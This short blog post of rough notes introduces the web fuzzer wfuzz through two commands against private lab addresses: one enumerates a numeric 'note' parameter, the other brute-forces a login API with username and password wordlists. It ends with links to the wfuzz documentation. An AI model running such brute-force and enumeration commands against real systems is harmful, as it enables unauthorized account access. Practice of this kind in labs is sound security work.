---
title: "Wfuzz introduction"
date: 2020-07-05T10:00:00
categories:
  - blog
tags:
  - wfuzz
  - rough cuts
---

wfuzz -c -z range,1-1000 --filter "chars>0" -u http://10.10.134.88/note.php?note=FUZZ

wfuzz -c -z file,Usernames/top-usernames-shortlist.txt -z
file,Passwords/xato-net-10-million-passwords-10000.txt --hs
"Incorrect" -d "username=FUZZ&password=FUZ2Z" -u
http://10.10.0.231/api/user/login

ref:
https://wfuzz.readthedocs.io/en/latest/user/advanced.html
https://wfuzz.readthedocs.io/en/latest/
